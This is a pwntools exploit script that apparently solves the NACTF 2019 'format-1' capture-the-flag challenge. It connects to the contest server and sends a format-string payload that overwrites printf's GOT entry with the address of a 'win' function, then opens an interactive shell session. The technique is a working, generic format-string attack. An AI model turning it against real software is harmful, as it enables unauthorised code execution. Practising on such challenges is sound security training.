from pwn import *

def exploit():
    #p = process("./format-1")
    p = remote("shell.2019.nactf.com", 31560)
    binary = ELF("format-1")

    got_printf = binary.symbols["got.printf"]
    win_addr = binary.symbols["win"]

    payload = ""
    payload += p32(got_printf)
    payload += p32(got_printf + 2)
    payload += "%4${}p".format(0x91b2 - len(payload))
    payload += "%4$hn"
    payload += "%{}p".format(0x10804 - 0x91b2)
    payload += "%5$hn"

    #gdb.attach(p, """
    #            b *vuln+48
    #            c
    #            """)

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()
